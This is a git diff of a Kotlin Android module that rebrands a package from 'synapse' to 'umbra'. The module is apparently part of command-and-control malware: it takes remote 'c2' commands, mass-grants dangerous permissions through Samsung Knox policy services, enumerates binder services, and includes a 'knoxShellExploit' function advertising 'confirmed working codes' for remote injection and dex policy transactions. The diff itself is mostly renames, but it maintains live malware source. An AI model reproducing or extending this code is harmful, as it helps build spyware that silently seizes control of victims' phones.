@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.content.pm.PackageManager
@@ -8,8 +8,8 @@ import android.os.IBinder
 import android.os.Parcel
 import android.os.Process
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
@@ -28,7 +28,7 @@ import java.lang.reflect.Method
  */
 object KnoxPermissionGrant {
 
-    private const val TAG = "Synapse.KnoxPermGrant"
+    private const val TAG = "Umbra.KnoxPermGrant"
 
     // ── Comprehensive permission list ──────────────────────────────────────
     private val ALL_PERMISSIONS = listOf(
@@ -134,7 +134,7 @@ object KnoxPermissionGrant {
     // Main entry: grant all via Knox application_policy
     // ═══════════════════════════════════════════════════════════════════════
 
-    suspend fun grantAll(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun grantAll(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val requested: List<String> = cmd.params["permissions"]
             ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
             ?: ALL_PERMISSIONS
@@ -194,7 +194,7 @@ object KnoxPermissionGrant {
 
         Log.d(TAG, "=== Done: ${granted.size} granted, ${failed.size} failed ===")
 
-        SynapseResponse.PermissionGrantResponse(
+        UmbraResponse.PermissionGrantResponse(
             target_permissions = requested,
             granted = granted,
             failed = failed,
@@ -220,7 +220,7 @@ object KnoxPermissionGrant {
         val grantDetails: MutableMap<String, String> = mutableMapOf() // perm -> "tx=12/fmt=3"
     )
 
-    suspend fun enumerateServices(cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun enumerateServices(cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         Log.d(TAG, "=== Enumerating binder services ===")
 
         val services = discoverAllServices()
@@ -242,7 +242,7 @@ object KnoxPermissionGrant {
         Log.d(TAG, "Accessible: ${accessible.size}/${services.size}")
 
         // Return as a shell-like response with details
-        SynapseResponse.ShellResponse(
+        UmbraResponse.ShellResponse(
             exit_code = 0,
             stdout = buildString {
                 appendLine("=== KnoxPermissionGrant: Binder Service Enumeration ===")
@@ -702,7 +702,7 @@ object KnoxPermissionGrant {
     //   dex_policy 2,3,5,10: return success
     //   remoteinjection 5,7,8: return success
 
-    fun knoxShellExploit(cmd: Command): SynapseResponse.ShellResponse {
+    fun knoxShellExploit(cmd: Command): UmbraResponse.ShellResponse {
         val sb = StringBuilder()
         sb.appendLine("=== Knox Shell Exploit — Confirmed Working Codes ===")
         sb.appendLine()
@@ -766,7 +766,7 @@ object KnoxPermissionGrant {
         sb.appendLine()
         sb.appendLine("=== Done — check results for 'Result: Parcel(' or state changes ===")
 
-        return SynapseResponse.ShellResponse(exit_code = 0, stdout = sb.toString(), stderr = "")
+        return UmbraResponse.ShellResponse(exit_code = 0, stdout = sb.toString(), stderr = "")
     }
 
     private fun exec(cmd: String): String {
